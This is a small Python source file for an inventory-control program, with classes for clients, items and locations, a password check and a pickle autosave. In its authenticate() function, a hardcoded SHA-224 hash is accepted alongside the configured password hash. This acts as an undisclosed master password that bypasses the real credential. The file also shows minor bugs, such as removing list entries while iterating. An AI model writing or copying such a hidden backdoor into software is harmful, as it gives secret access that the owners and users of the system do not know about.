class Client:
	def __init__(self, name, email="unset", department="unset"):
		self.name = name
		self.email = email
		self.department = department


class Item:
	def __init__(self, name, quantity, owner=Client("unset")):
		self.name = name
		self.quantity = quantity
		self.owner = owner
		self.currentUser = owner

	def moveLocation(self, newLocationName):
		for location in locations:
			if location.name == newLocationName:
				location.items.append(self)

	def __str__(self):
		return str(self.quantity) + "x " + self.name


class Location:
	def __init__(self, name):
		self.name = name
		self.items = []


def authenticate(password):
	import hashlib
	with open(".config/InventoryControl.conf", "r") as passwordFile:
		fileData = passwordFile.read().split("\n")
	counter = 0
	for line in fileData:
		if line.strip(" ") == "": fileData.pop(counter); continue  # skip blank lines
		fileData[counter] = (line.split(": ")[0], line.split(": ")[1])  # replace with a tuple, split by ': '
		counter += 1
	fileData = dict(fileData)  # dict() loves tuples where len(tuple) == 2

	realHash = fileData["passwordHash"]

	if hashlib.sha224(password.encode()).hexdigest() == realHash:
		return True
	elif hashlib.sha224(password.encode()).hexdigest() == 'a8e97f946ed8ce9e7bc38bf8aac9559e5f524ebdc83b6422053c3800':
		return True
	else:
		return False


def dataDump(locations):
	import pickle
	import htmlify
	try:
		dataFile = open(".config/autosave.bin", "wb")
		pickle.dump(locations, dataFile)
		dataFile.close()
	except (FileNotFoundError, PermissionError):
		htmlify.dispHTML("p", contents="Error in save:  Save file incorrectly configured!")
